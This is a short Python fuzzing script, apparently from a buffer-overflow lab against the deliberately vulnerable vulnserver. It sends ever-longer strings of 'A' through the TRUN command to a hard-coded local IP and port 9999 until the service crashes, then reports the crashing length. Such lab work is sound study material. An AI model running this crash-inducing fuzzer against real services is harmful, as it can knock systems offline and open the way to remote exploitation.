#!/usr/bin/python

"""This program is designed for fuzzing purposes in a buffer-overflow attack (using vulnserver). It takes the IP and port of your target machine,
   and sends an increasing array of characters until the connection terminates (indicating buffer overflow). It then outputs the 
   length of the last payload to determine the approximate buffer offset size."""

import sys, socket
from time import sleep

# Buffer Payload
buffer = 'A' * 100

while True:
	try:	
		# Initialize connection
		s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
		s.connect(('192.168.1.142',9999))
		
		# Send payload through command 
		s.send(('TRUN /.:/' + buffer))
		s.close()
		sleep(1)

		# Increase size of payload
		buffer = buffer + "A"*100

	except:
		print("Fuzzing crashed at {} bytes".format(len(buffer)))
		sys.exit()
